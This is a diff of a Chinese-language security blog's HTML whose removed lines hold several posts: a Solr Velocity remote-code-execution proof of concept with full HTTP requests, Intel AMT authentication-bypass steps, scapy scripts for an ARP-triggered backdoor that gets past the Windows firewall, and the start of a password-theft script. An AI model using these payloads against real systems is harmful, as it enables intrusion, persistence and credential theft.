@@ -5,15 +5,19 @@
   
 
   
-  <title>Trace Blog</title>
+  <title>JavaSecCalendar2019-Writeup学习 | Trace Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Trace Blog">
-<meta property="og:url" content="http://yoursite.com/index.html">
+  <meta name="description" content="Day 1 - Candy CaneSource:1234567891011121314151617181920212223242526272829303132import org.jdom2.Content;import org.jdom2.Document;import org.jdom2.JDOMException;import org.jdom2.input.SAXBuilder;publ">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JavaSecCalendar2019-Writeup学习">
+<meta property="og:url" content="http://yoursite.com/2020/01/05/JavaSecCalendar2019-Writeup/index.html">
 <meta property="og:site_name" content="Trace Blog">
+<meta property="og:description" content="Day 1 - Candy CaneSource:1234567891011121314151617181920212223242526272829303132import org.jdom2.Content;import org.jdom2.Document;import org.jdom2.JDOMException;import org.jdom2.input.SAXBuilder;publ">
 <meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2020-03-20T01:38:48.720Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Trace Blog">
+<meta name="twitter:title" content="JavaSecCalendar2019-Writeup学习">
+<meta name="twitter:description" content="Day 1 - Candy CaneSource:1234567891011121314151617181920212223242526272829303132import org.jdom2.Content;import org.jdom2.Document;import org.jdom2.JDOMException;import org.jdom2.input.SAXBuilder;publ">
   
     <link rel="alternate" href="/atom.xml" title="Trace Blog" type="application/atom+xml">
   
@@ -60,9 +64,7 @@
   </div>
 </header>
       <div class="outer">
-        <section id="main">
-  
-    <article id="post-JavaSecCalendar2019-Writeup" class="article article-type-post" itemscope itemprop="blogPost">
+        <section id="main"><article id="post-JavaSecCalendar2019-Writeup" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2020/01/05/JavaSecCalendar2019-Writeup/" class="article-date">
   <time datetime="2020-01-05T10:27:35.000Z" itemprop="datePublished">2020-01-05</time>
@@ -75,8 +77,8 @@
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/01/05/JavaSecCalendar2019-Writeup/">JavaSecCalendar2019-Writeup学习</a>
+    <h1 class="article-title" itemprop="name">
+      JavaSecCalendar2019-Writeup学习
     </h1>
   
 
@@ -178,241 +180,19 @@
     </footer>
   </div>
   
-</article>
-
-
+    
+<nav id="article-nav">
   
-    <article id="post-Solr-Rce-Velocity" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2019/11/26/Solr-Rce-Velocity/" class="article-date">
-  <time datetime="2019-11-26T12:24:05.000Z" itemprop="datePublished">2019-11-26</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/11/26/Solr-Rce-Velocity/">Solr_Rce_Velocity学习</a>
-    </h1>
+    <a href="/2019/11/26/Solr-Rce-Velocity/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Solr_Rce_Velocity学习</div>
+    </a>
   
+</nav>
 
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="solr环境搭建"><a href="#solr环境搭建" class="headerlink" title="solr环境搭建"></a>solr环境搭建</h1><p>作者使用的是idea,solr 8.1.1,主要参考了<a href="https://www.jianshu.com/p/4ceeb2c20002" target="_blank" rel="noopener">这篇文章</a>，以下是个人总结<br>先下载源码solr-8.1.1-src.zip<br>然后进入～\solr-8.1.1-src\ lucene\目录里<br>使用ant idea 如果报错 执行ant ivy-bootstrap<br>编译成功后 使用open project方式打开<br>然后进入到～\lucene\solr\目录下,执行ant server创建solr server<br>Solr的默认路径为～\lucene\solr\server\solr</p>
-<p>然后，在idea配置远程调试。在“Run Configurations”里添加Remote，在配置中，自定义Name，Host，和Port。<br>我们在cmd中进入lucene-solr\solr\bin文件夹中，运行solr start -p 8988 -f -a “-Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=y,address=8988”<br>配置的端口号（e.g. 8988）要与在idea中配置的端口号一致。<br>最后，在idea中运行debug模式。我们在网页中<a href="http://localhost:8988，则可以开始进行调试。" target="_blank" rel="noopener">http://localhost:8988，则可以开始进行调试。</a></p>
-<h1 id="第一步：修改配置文件"><a href="#第一步：修改配置文件" class="headerlink" title="第一步：修改配置文件"></a>第一步：修改配置文件</h1><p>POC:<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/solr/new_core/config</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: localhost:8988</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0</span><br><span class="line"><span class="attribute">Accept</span>: application/json, text/plain, */*</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">X-Requested-With</span>: XMLHttpRequest</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="attribute">Content-Length</span>: 259</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  "update-queryresponsewriter": &#123;</span><br><span class="line">    "startup": "lazy",</span><br><span class="line">    "name": "velocity",</span><br><span class="line">    "class": "solr.VelocityResponseWriter",</span><br><span class="line">    "template.base.dir": "",</span><br><span class="line">    "solr.resource.loader.enabled": "true",</span><br><span class="line">    "params.resource.loader.enabled": "true"</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>通过阅读Web.xml，我们发现所有的请求都会发到SolrRequestFilter，我们直接去读相关类的代码。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>SolrRequestFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.apache.solr.servlet.SolrDispatchFilter<span class="tag">&lt;<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    .....</span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>SolrRequestFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">  .....</span><br></pre></td></tr></table></figure></p>
-<p>org/apache/solr/servlet/SolrDispatchFilter.java<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest _request, ServletResponse _response, FilterChain chain, <span class="keyword">boolean</span> retry)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        Action result = call.call();</span><br><span class="line">        <span class="keyword">switch</span> (result) &#123;</span><br><span class="line">          <span class="keyword">case</span> PASSTHROUGH:</span><br><span class="line">            chain.doFilter(request, response);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> RETRY:</span><br><span class="line">            doFilter(request, response, chain, <span class="keyword">true</span>); <span class="comment">// RECURSION</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> FORWARD:</span><br><span class="line">            request.getRequestDispatcher(call.getPath()).forward(request, response);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> ADMIN:</span><br><span class="line">          <span class="keyword">case</span> PROCESS:</span><br><span class="line">          <span class="keyword">case</span> REMOTEQUERY:</span><br><span class="line">          <span class="keyword">case</span> RETURN:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    ....</span><br></pre></td></tr></table></figure></p>
-<p>在call()方法里进行了一系列的调用实现里配置持久化,配置文件路径:~/solr-8.1.1-src/solr/server/solr/new_core/conf/configoverlay.json</p>
-<h1 id="第二步-velocity模版注入"><a href="#第二步-velocity模版注入" class="headerlink" title="第二步:velocity模版注入"></a>第二步:velocity模版注入</h1><p>POC<br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/solr/new_core/select?wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27whoami%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: localhost:8988</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0</span><br><span class="line"><span class="attribute">Accept</span>: application/json, text/plain, */*</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">X-Requested-With</span>: XMLHttpRequest</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br></pre></td></tr></table></figure></p>
-<p>整体的原理是wt参数获取模版类型，然后模版注入。这个老哥的图太牛逼了，直接上图。<br><img src="/2019/11/26/Solr-Rce-Velocity/flow.png" alt="flow"><br>来源:<a href="http://www.lmxspace.com/2019/11/03/Solr-RCE-via-Velocity-template/" target="_blank" rel="noopener">http://www.lmxspace.com/2019/11/03/Solr-RCE-via-Velocity-template/</a></p>
-<h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><p>如何去防御呢，我个人觉得可以分为<br>1.不让修改配置<br>2.过滤ssti注入<br>个人觉得都不是很好的方法，因为第一影响到了使用性，第二基于黑名单的过滤不是那么的可靠。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/11/26/Solr-Rce-Velocity/" data-id="ck7zimyz2000058u4djsx7wtq" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
   
 </article>
-
-
-  
-    <article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2018/10/14/hello-world/" class="article-date">
-  <time datetime="2018-10-14T01:40:24.747Z" itemprop="datePublished">2018-10-14</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/10/14/hello-world/">Hello World</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/10/14/hello-world/" data-id="ck7zimyzc000458u45lr0p5s0" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-关机就安全了吗" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2018/06/28/关机就安全了吗/" class="article-date">
-  <time datetime="2018-06-28T06:07:36.000Z" itemprop="datePublished">2018-06-28</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/06/28/关机就安全了吗/">关机就安全了吗</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>在漏洞频发的今天，怎么才能保持自己的电脑的安全呢？关机或许是个不错的选择。可是关机就真的安全了吗？黑客能否远程开启你的计算机搞你呢？本文介绍两个关机也能搞的漏洞。</p>
-<h2 id="技术细节"><a href="#技术细节" class="headerlink" title="技术细节"></a>技术细节</h2><h3 id="CVE-2017-5689"><a href="#CVE-2017-5689" class="headerlink" title="CVE-2017-5689"></a>CVE-2017-5689</h3><h4 id="Intel-AMT技术"><a href="#Intel-AMT技术" class="headerlink" title="Intel AMT技术"></a>Intel AMT技术</h4><p>Intel AMT其全称为INTEL Active Management Technology(英特尔主动管理技术)，它实质上是一种集成在芯片组中的嵌入式系统，不依赖特定的操作系统，这也是IAMT与远程控制软件最大的不同。该技术会对外开放16992和16993端口，以便管理员远程维护。<img src="/2018/06/28/关机就安全了吗/login.PNG" alt=""></p>
-<h3 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h3><p>影响版本:<br>太多型号详见：<br><a href="https://www.securityfocus.com/bid/98269" target="_blank" rel="noopener">https://www.securityfocus.com/bid/98269</a></p>
-<p>AMT 登录管理中通过response_length值来进行判断，也即关键代码：</p>
-<pre><code class="C"><span class="keyword">if</span>(<span class="built_in">strncmp</span>(computed_response, user_response, response_length)) 
-deny_access();
-</code></pre>
-<p>这个标准函数仅仅比较两个字符串中每一个的response_length字节，看看它们是不是一样，加以比较的两个字符串是试图登录所发送的验证响应(user_response)和服务要求的响应(computed_response)。如果两者相符，密码肯定对的，所以该函数返回零，代码继续授予访问权。如果两个字符串不一样，该函数返回值是非零，这意味着密码不对，所以拒绝访问。所以如果提供的是空字符串，长度为零，没有字节被检查，因而没有字节是不一样的;不出所料，strncmp()返回零，表明验证成功。因而，空的响应字符串被认为有效而被放行，实际上明明是无效的，因此通过修改response的所有值为空，即可绕过验证进行登录。<a href="https://embedi.com/wp-content/uploads/dlm_uploads/2017/11/silent-bob-is-silent.pdf。" target="_blank" rel="noopener">https://embedi.com/wp-content/uploads/dlm_uploads/2017/11/silent-bob-is-silent.pdf。</a></p>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用burpcuit，单击“Proxy”-“Option”，在“Match and Replace”中新建或者编辑Request Header条目，Match值为response\s*=”[0-9a-f]+”，Replace 的值为response=””，在拦截(Intercept)中设置拦截开关为“Intercept is On”。用户名输入admin，密码随便输入。即可绕过登陆，绕过登陆后，可以直接添加管理员账号，开关机，远程挂载CD等。但是肯定有人会好奇那我怎么去看它桌面呢？像使用远控一样。强大的Intel给我们提供了AMT管理工具包，使用vnc既可以远程控制。下载地址:<a href="http://info.meshcentral.com/downloads/mdtk/meshcommander.msi" target="_blank" rel="noopener">http://info.meshcentral.com/downloads/mdtk/meshcommander.msi</a><br><img src="/2018/06/28/关机就安全了吗/remotedesktop.PNG" alt=""></p>
-<h3 id="CVE-2017-12542"><a href="#CVE-2017-12542" class="headerlink" title="CVE-2017-12542"></a>CVE-2017-12542</h3><h4 id="HP-iLo技术"><a href="#HP-iLo技术" class="headerlink" title="HP iLo技术"></a>HP iLo技术</h4><p>iLo是Integrated lights-out的简称，是HP服务器上集成的远程管理端口，只要将服务器接入网络并且没有断开服务器的电源，不管HP服务器处于何种状态（开机关机重启），都可以允许用户通过网络进行远程管理。简单的说，iLo是高级别的远程KVM系统，可以将服务器的信息显示在本地，并且使用本地的键盘鼠标控制操作服务器，并可以将本地的光盘镜像，文件夹作为虚拟光驱映射并加载到服务器中。使用iLo,可以完成底层的BIOS的设置磁盘的RAID和一系列的操作系统的底层工作。</p>
-<h3 id="漏洞细节-1"><a href="#漏洞细节-1" class="headerlink" title="漏洞细节"></a>漏洞细节</h3><p>影响版本:<br>HP Integrated Lights-Out 4 firmware 2.50<br>HP Integrated Lights-Out 4 firmware 2.44<br>HP Integrated Lights-Out 4 firmware 2.22<br>HP Integrated Lights-Out 4 firmware 2.20<br>HP Integrated Lights-Out 4 firmware 2.03<br>HP Integrated Lights-Out 4 firmware 1.32<br>HP Integrated Lights-Out 4 firmware 1.30<br>HP Integrated Lights-Out 4 firmware 1.22<br>HP Integrated Lights-Out 4 firmware 1.13<br>HP Integrated Lights-Out 4 firmware 1.11<br>HP Integrated Lights-Out 4 firmware 2.10<br><a href="https://airbus-seclab.github.io/ilo/SSTIC2018-Slides-EN-Backdooring_your_server_through_its_BMC_the_HPE_iLO4_case-perigaud-gazet-czarny.pdf" target="_blank" rel="noopener">https://airbus-seclab.github.io/ilo/SSTIC2018-Slides-EN-Backdooring_your_server_through_its_BMC_the_HPE_iLO4_case-perigaud-gazet-czarny.pdf</a></p>
-<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>利用比较简单，绕过验证，添加用户。然后使用HP提供的管理工具连上去管理就可以了。<br>exploit:<a href="https://www.exploit-db.com/exploits/44005/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/44005/</a><br>管理工具下载:<a href="https://support.hpe.com/hpsc/swd/public/detail?swItemId=MTX_4f842ceb31cf48d392e22705a8" target="_blank" rel="noopener">https://support.hpe.com/hpsc/swd/public/detail?swItemId=MTX_4f842ceb31cf48d392e22705a8</a><br><img src="/2018/06/28/关机就安全了吗/iLo-remotedesktop.PNG" alt=""></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/06/28/关机就安全了吗/" data-id="ck7zimyze000558u4equc4bm3" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-穿透Windows防火墙唤醒后门" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2018/05/15/穿透Windows防火墙唤醒后门/" class="article-date">
-  <time datetime="2018-05-15T09:28:56.000Z" itemprop="datePublished">2018-05-15</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/05/15/穿透Windows防火墙唤醒后门/">穿透Windows防火墙唤醒后门</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在渗透测试过程中，我们常常会遇到这种情况，目标上的木马被杀了，留了正向后门，却因为windows防火墙的原因，无法唤醒。所以我们就需要一种方法，来bypass防火墙唤醒我们的后门或者作为后门。</p>
-<h2 id="技术细节"><a href="#技术细节" class="headerlink" title="技术细节"></a>技术细节</h2><h3 id="选择协议"><a href="#选择协议" class="headerlink" title="选择协议"></a>选择协议</h3><p>首先我们要远程唤醒，必然是要选择一种网络协议的。为了满足我们的需求，传输层及以传输层以上的协议是必然不能选择的。物理层和数据链路层是我们无法控制的。所以我们只能选择网络层的协议。网络层的协议(IP/ICMP/ARP/RARP/BGP)有以上协议供我们选择。</p>
-<h3 id="ARP协议-局域网中的工作情况"><a href="#ARP协议-局域网中的工作情况" class="headerlink" title="ARP协议(局域网中的工作情况)"></a>ARP协议(局域网中的工作情况)</h3><p>ARP协议是设计用来通过网络地址(ip)定位MAC地址。在以太网协议中规定，同一局域网中的一台主机要和另一台主机进行直接通信，必须要知道目标主机的MAC地址。而在TCP/IP协议中，网络层和传输层只关心目标主机的IP地址。这就导致在以太网中使用IP协议时，数据链路层的以太网协议接到上层IP协议提供的数据中，只包含目的主机的IP地址。于是需要一种方法，根据目的主机的IP地址，获得其MAC地址。这就是ARP协议要做的事情。所谓地址解析（address resolution）就是主机在发送帧前将目标IP地址转换成目标MAC地址的过程。在windows操作系统上使用arp -a即可看到自己的arp缓存表。</p>
-<h3 id="ARP报文结构"><a href="#ARP报文结构" class="headerlink" title="ARP报文结构"></a>ARP报文结构</h3><p><img src="/2018/05/15/穿透Windows防火墙唤醒后门/./arp-packet.jpg" alt="arp报文结构"><br>如果目的端主机的硬件地址是FF:FF:FF:FF:FF:FF，那么这是一个以太网广播地址。电缆上的每个以太网接口都要接收这个数据帧并对它进行处理。</p>
-<h3 id="后门设计"><a href="#后门设计" class="headerlink" title="后门设计"></a>后门设计</h3><p>ARP默认防火墙是放行的,我们在受害者机器上监听ARP广播,如果有我们的特征码传过来，则唤醒后门进行下一步操作。在此我们使用scapy进行模拟。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">listener.py</span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">arp_display</span><span class="params">(pkt)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> pkt[ARP].op == <span class="number">1</span>:  <span class="comment"># who-has (request)</span></span><br><span class="line">        <span class="keyword">if</span> pkt[ARP].pdst == <span class="string">'xxxxxxx'</span>:</span><br><span class="line">            os.system(<span class="string">'xxxxx'</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Request: &#123;&#125; is asking about &#123;&#125;'</span>.format(pkt[ARP].psrc, pkt[ARP].pdst)</span><br><span class="line">    <span class="keyword">if</span> pkt[ARP].op == <span class="number">2</span>:  <span class="comment"># is-at (response)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'*Response: &#123;&#125; has address &#123;&#125;'</span>.format(pkt[ARP].hwsrc, pkt[ARP].psrc)</span><br><span class="line"> </span><br><span class="line">sniff(prn=arp_display, filter=<span class="string">'arp'</span>, store=<span class="number">0</span>, count=<span class="number">100</span>)</span><br></pre></td></tr></table></figure></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">hacker.py</span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ip1</span><span class="params">(ip)</span>:</span></span><br><span class="line">    pkt = send(ARP(op=ARP.who_has, psrc=<span class="string">"hacker"</span>, pdst=ip),loop=<span class="number">1</span>)</span><br><span class="line">    x = sniff(filter=<span class="string">"arp"</span>, count=<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">print</span> (x.summary())</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"done"</span>)</span><br><span class="line"></span><br><span class="line">ip1(<span class="string">"xxxx"</span>)</span><br></pre></td></tr></table></figure>
-<p>在受害者上运行listener.py,监听arp广播,攻击者运行hacker.py，广播寻找一个ip地址，受害者监听到这个广播地址，则会唤醒后门。</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在渗透测试的过程中，只要有信息交换的地方，都有可能被设计为C&amp;C或者用来唤醒后门或者用来偷数据，比如360研究的ghost tunnel，比如arp。 </p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/05/15/穿透Windows防火墙唤醒后门/" data-id="ck7zimyzf000658u4t0ai0zvk" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Windows/">Windows</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/后门/">后门</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-Windows密码窃取" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2018/04/26/Windows密码窃取/" class="article-date">
-  <time datetime="2018-04-25T16:59:47.000Z" itemprop="datePublished">2018-04-26</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/04/26/Windows密码窃取/">Windows密码窃取</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在很多渗透测试过程中，需要实时监控一些数据，比如Windows的密码等。网上已经很多工具和方法实现，但是都只是将数据保存在本地，无法远程获取。所以一旦丢失权限，还是那不到密码。出于这个需求就开发了此脚本。</p>
-<h2 id="技术细节"><a href="#技术细节" class="headerlink" title="技术细节"></a>技术细节</h2><p>此脚本才用powershell编写,数据通过RSA加密，HTTP协议传输，所以注定了只能传输很少的内容。此脚本工作涉及三台机器,Target，VPS，Hacker.<br>第一步：<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成公钥和私钥保存起来</span></span><br><span class="line"><span class="variable">$rsa</span> = <span class="built_in">New-Object</span> -TypeName System.Security.Cryptography.RSACryptoServiceProvider</span><br><span class="line"><span class="variable">$publickey</span> = <span class="variable">$rsa</span>.ToXmlString(<span class="string">"false"</span>);</span><br><span class="line"><span class="variable">$publickey</span>;</span><br><span class="line"><span class="variable">$privatekey</span> = <span class="variable">$rsa</span>.ToXmlString(<span class="string">"true"</span>);</span><br><span class="line"><span class="variable">$privatekey</span>;</span><br></pre></td></tr></table></figure></p>
